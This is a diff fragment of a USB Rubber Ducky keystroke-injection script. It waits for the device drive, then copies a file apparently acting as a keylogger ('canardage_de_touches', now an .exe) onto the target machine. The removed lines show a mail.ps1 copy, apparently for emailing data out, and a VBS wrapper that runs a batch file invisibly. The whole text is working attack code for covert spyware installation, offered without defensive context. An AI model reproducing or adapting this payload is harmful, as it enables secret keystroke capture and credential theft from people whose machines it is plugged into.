@@ -38,7 +38,7 @@ STRING goto :break
 ENTER
 STRING )
 ENTER
-STRING timeout /t 30
+STRING timeout /t 3
 ENTER
 STRING goto :while1
 ENTER
@@ -46,29 +46,7 @@ STRING :break
 ENTER
 REM Continue script.
 REM Remove the next two lines if you don't place your payloads in separate folders. 
-STRING copy %DUCKYdrive%canardage_de_touches.ps1 C:\dev\canardage_de_touches.ps1
+STRING copy /B %DUCKYdrive%canardage_de_touches.exe C:\dev\canardage.exe
 ENTER
 CONTROL z
-ENTER
-STRING copy %DUCKYdrive%mail.ps1 C:\dev\mail.ps1
-ENTER
-CONTROL z
-ENTER
-
-REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
-REM Delete vbs file if already exists
-STRING erase /Q invis.vbs
-ENTER
-REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
-STRING copy con invis.vbs
-ENTER
-STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
-ENTER
-CONTROL z
-ENTER
-
-REM RUN THE BATCH FILE
-STRING wscript.exe invis.vbs DuckyWait.bat
-ENTER
-STRING EXIT
 ENTER
